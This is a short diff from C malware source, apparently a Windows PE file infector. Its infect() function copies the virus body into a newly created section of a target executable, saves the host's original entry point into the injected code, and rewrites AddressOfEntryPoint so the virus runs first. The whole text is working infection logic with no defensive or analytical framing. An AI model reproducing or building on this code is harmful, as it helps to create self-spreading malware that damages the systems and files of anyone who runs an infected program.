@@ -56,8 +56,13 @@ int infect(const char* filename, data_t* data) {
 
   create_section_header(sectionHeader, ntHeaders, data->codeSize);
 
-  memcp(data->codeBegin, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
+  void* targetCodeBegin = (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData;
+  memcp(data->codeBegin, targetCodeBegin, data->codeSize);
 
+  uint32_t oep = ntHeaders->OptionalHeader.AddressOfEntryPoint;
+  if (write_original_entry_point(oep, targetCodeBegin) != 0) {
+    PRINT_DEBUG("could not save original entry point\n");
+  }
   ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress + data->entryOffset;
 
   data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
